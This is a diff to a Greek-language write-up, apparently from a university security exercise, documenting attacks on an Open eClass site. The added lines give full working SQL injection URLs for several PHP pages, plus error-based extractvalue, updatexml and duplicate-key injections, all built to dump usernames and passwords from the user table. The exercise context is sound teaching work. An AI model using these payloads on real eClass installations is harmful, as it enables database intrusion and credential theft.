@@ -143,9 +143,9 @@
        Με αυτό το σκεπτικό έγιναν πάνω κάτω όλες οι επιθέσεις για __SQL Injection__
        
        
-       - Στη σελίδα __/modules/auth/contactadmin.php__ υπάρχει ένα σημαντικό κενό από το οποίο μπορούμε \
-         να αντλήσουμε όλα τα δεδομένα της βάσης. Στην περιγραφή του defacement μας περιγράφηκε η διαδικασία \
-	 που χρησιμοπιήθηκε.
+       - Στη σελίδα ___contactadmin.php___ (_δούλεψε στον target μας_)\
+       	 υπάρχει ένα σημαντικό κενό από το οποίο μπορούμε να αντλήσουμε όλα τα δεδομένα της βάσης. Στην περιγραφή \
+	 του defacement μας περιγράφηκε η διαδικασία που χρησιμοπιήθηκε.
 	 
 	 Ουσιαστικά αρχικά ελέγξαμε ότι αν βάλουμε ένα ' δίπλα από το userid=1 χαλάει το SQL Query και εξαφανίζονται \
 	 δεδομένα από τη σελίδα
@@ -176,11 +176,68 @@
 	 
 	 Αυτό το request, όπως ανα φέρθηκε προηγουμένως, επιστρέφει όλα τα δεδομένα των χρηστών που είναι καταχωρημένοι \
 	 στο σύστημα, μαζί με του drunkadmin!
+	 
+       ##### ___Τα δεδομένα εμφανίζονται στη θέση του επωνύμου___
 
 
+       - Στη σελίδα ___work.php___ (_δούλεψε στον target μας_)\
+       	 μπορέσαμε με τον ίδιο ακριβώς τρόπο με του ___contactadmin.php___ να πάρουμε όλα τα δεδομένα της βάσης. Σε αυτό \
+	 το σημέιο, χρησιμοποιήσαμε το __id__ που υπάρχει στο URL και χαλώντας το SQL query πήραμε τα αποτελέσματα που θέλουμε.
+	 
+	 > http://hackerz.csec.chatzi.org/modules/work/work.php?id=' union (select group_concat(0x3c62723e,user_id,0x3a,0x3a,nom,0x3a,0x3a,prenom,0x3a,0x3a,username,0x3a,0x3a,password) from eclass.user) -- -
 
+       ##### ___Τα δεδομένα εμφανίζονται σε λευκη σελίδα με το SQL error μαζί___
+	 
+	 
+       - Στη σελίδα ___reply.php___ (_δε λειτούργησε στον target μας, δουλεύει σε unpatched_) \
+       	 μπορούμε να χρησιμοποιήσουμε τη μεταβητή __topic__ ώστε με τον ίδιο τρόπο με παραπάνω να πάρουμε τα περιεχόμενα \
+	 της βάσης.
+	 
+	> http://hackerz.csec.chatzi.org/modules/phpbb/reply.php?forum=1&topic=1 and 1=2) union all select 1,group_concat(0x3c62723e,user_id,0x3a,0x3a,nom,0x3a,0x3a,prenom,0x3a,0x3a,username,0x3a,0x3a,password),3,4 from eclass.user limit 2 -- -
 
+       ##### ___Τα δεδομένα εμφανίζονται στο breadcrumb___
+	 
+	 
+       - Στη σελίδα ___newtopic.php___ (_δε λειτούργησε στον target μας, δουλεύει σε unpatched_) \
+       	 μπορούμε να χρησιμοποιήσουμε τη μεταβητή __forum__ ώστε με τον ίδιο τρόπο με παραπάνω να πάρουμε τα περιεχόμενα \
+	 της βάσης.
+	 
+	> http://hackerz.csec.chatzi.org/modules/phpbb/newtopic.php?forum=1' and '1'='2') union (select group_concat(0x3c62723e,user_id,0x3a,0x3a,nom,0x3a,0x3a,prenom,0x3a,0x3a,username,0x3a,0x3a,password),2,3 from eclass.user) -- -
 
+       ##### ___Τα δεδομένα εμφανίζονται στο breadcrumb___
+	 
+	 
+       - Στη σελίδα ___unregcours.php___ (_δε λειτούργησε στον target μας, δουλεύει σε unpatched_) \
+       	 μπορούμε να χρησιμοποιήσουμε τη μεταβητή __cid__ ώστε με τον ίδιο τρόπο με παραπάνω να πάρουμε τα περιεχόμενα \
+	 της βάσης.
+	 
+	> http://hackerz.csec.chatzi.org/modules/unreguser/unregcours.php?u=4&cid=' union select group_concat(0x3c62723e,user_id,0x3a,0x3a,nom,0x3a,0x3a,prenom,0x3a,0x3a,username,0x3a,0x3a,password) from eclass.user -- -
+
+       ##### ___Τα δεδομένα εμφανίζονται στη θέση εμφάνισης του κωδικού του μαθήματος (πχ ΤΜΑ100)___
+	 
+	 
+
+  - __XPATH Injections / Duplicate Error Injection__
+       
+       Μια παραλλαγή των παραπάνω SQL Injections, αποτελούν τα XPATH και Duplicate Error Injections. \
+       Με τις προηγούμενες μεθόδους, κάναμε injections σε __SELECR__ statements. Με αυτά τα injections \
+       μπορούμε να εκμεταλλευτούμε και να αντλήσουμε πληροφορίες από __UPDATE__, __INSERT__ και __DELETE__ statements.
+       
+       Εντοπίστηκαν τέτοιου είδους injections σε δύο σημεία.
+       
+       - Στη σελίδα ___viewforum.php___ (_δούλεψε στον target μας_) \
+       	 στα καμπανάκια γίνεται update το state στη βάση. Έτσι μέσω της μεταβλητής __topicnotify__, μπορούμε να πάρουμε \
+	 χρήσιμη πληροφορία μέσω πολλαπλών εμφολευμένων SELECT, όπου και επιστρέφει το πιο printable αποτέλεσμα ή μέσω \
+	 συναρτήσεων όπως οι __updatexml()__ και __extractvalue()__.\
+	 
+	 > http://192.168.1.12/modules/phpbb/viewforum.php?forum=1&topicnotify=' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT group_concat(username,0x3a,password) FROM eclass.user LIMIT 0,1) ) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or ' &topic_id=1
+	 
+	 > http://192.168.1.12/modules/phpbb/viewforum.php?forum=1&topicnotify=' or extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1))) or' &topic_id=1
+	 
+	 > http://192.168.1.12/modules/phpbb/viewforum.php?forum=1&topicnotify=' or updatexml(0,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1)),0) or '&topic_id=1
+
+       
+       
 ---
 ## Defense Tactics
        
